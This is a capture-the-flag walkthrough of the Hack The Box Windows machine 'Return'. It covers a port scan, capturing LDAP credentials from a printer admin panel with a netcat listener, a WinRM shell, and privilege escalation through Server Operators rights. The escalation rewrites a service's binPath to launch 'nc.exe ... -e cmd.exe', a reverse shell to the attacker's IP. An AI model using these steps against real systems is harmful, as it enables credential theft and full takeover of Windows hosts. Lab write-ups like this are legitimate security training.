---
title: "HTB Return"
permalink: /writeups/return
location: default
---

# HTB Return

**Machine Information**

	IP : 10.10.11.108
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.11.108 -- -sC -sV
```

This should reveal multiple running services including a `http`, `kerberos`,  `smb` and `ldap`.

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-07-04 09:06:35Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
49744/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 31931/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22871/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26260/udp): CLEAN (Timeout)
|   Check 4 (port 37269/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2024-07-04T09:07:32
|_  start_date: N/A
```

### Getting a Foothold

**HTTP**

The `nmap` scan shows that a web server is running on port `80`. Visiting the website shows a printer web page.

<http://10.10.11.108/index.php>

Checking the settings page shows a form with a server address, server port, username, and password field.

<http://10.10.11.108/settings.php>

If we attempt to change the password and inspect the request using Burp Suite it shows that only one parameter, `ip`, is actually sent.

```
ip=printer.return.local
```

To test what this request is actually doing start a `netcat` listener on our attack machine and change the `ip` parameter to our own IP address.

```
nc -nvlp 389
```

Send the request and check the `netcat` listener to see what appears to be a password.

**Evil-WinRM**

Use `evil-winrm` to get a shell on the target machine using the credentials we received.

```
evil-winrm -i 10.10.11.108 -u svc-printer
```

The flag can be retrieved from the following directory:

```
C:\Users\svc-printer\Desktop\user.txt
```

### Privilege Escalation

**Excessive Group Permissions**

After gaining access to the target system we should check the user information.

```
net user svc-printer
```

This shows that our user is part of the "Server Operators" group.

```
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/4/2024 2:25:00 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```

This can potentially be exploited to escalate our privileges as this group has special privileges to make changes in the domain. Check the running services with `services`. This reveals one that we can take advantage of.

```
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                True VMTools
```

**Reverse Shell**

Upload a `nc.exe` binary to the target machine. Use our permissions to change the binary path for `VMTools` with the following command:

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe 10.10.14.22 9001 -e cmd.exe"
```

Start a new `netcat` listener and use our shell to stop and start `VMTools` to get a shell.

```
sc.exe stop VMTools
sc.exe start VMTools
```

Success!

```
C:\Windows\system32>whoami
nt authority\system
```

The flag can be grabbed from the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
